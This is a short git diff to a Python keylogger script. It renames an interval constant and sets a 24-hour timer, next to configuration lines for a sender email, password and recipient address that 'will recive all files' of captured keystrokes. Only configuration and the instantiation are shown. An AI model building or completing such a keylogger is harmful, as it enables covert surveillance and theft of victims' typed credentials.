@@ -21,7 +21,7 @@ from datetime import datetime
 
 EMAIL = "" #insert email that will send files
 EMAILPASS = "" # email sender password
-SECINDAY = 86400
+TIMER = 86400 # time is automatically set for 24 hrs
 EMAILRECIVE = "" #email that will recive all files
 LOGGING = True
 
@@ -121,5 +121,5 @@ class KeyLogger:
 
 
 if __name__ == "__main__":
-    # make interval SECINDAY after done testing
-    k = KeyLogger(interval=SECINDAY)
+    # make interval TIMER after done testing
+    k = KeyLogger(interval=TIMER)
